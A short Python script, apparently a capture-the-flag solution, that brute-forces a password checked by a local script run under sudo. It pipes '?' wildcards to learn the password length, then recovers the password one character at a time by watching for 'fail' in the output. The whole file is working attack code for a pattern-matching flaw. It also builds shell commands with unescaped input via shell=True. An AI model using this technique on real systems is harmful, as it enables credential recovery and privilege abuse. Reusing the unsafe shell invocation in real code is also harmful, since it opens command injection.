import subprocess
import string
pd = []
s=string.printable

def reco(jp):
    re = subprocess.run(f'echo {jp} | sudo ./aha.sh', shell=True, stdout=subprocess.PIPE, text=True)
    return re.stdout
while True:
    rei=reco(''.join(pd))
    if 'fail' not in rei:
        print(len(pd))
        break
    pd.append('?')

for j in range(len(pd)):
    for l in s:
        pd[j]=l
        rei1=reco(''.join(pd))
        if 'failed!' not in rei1:
            print(''.join(pd))
            break
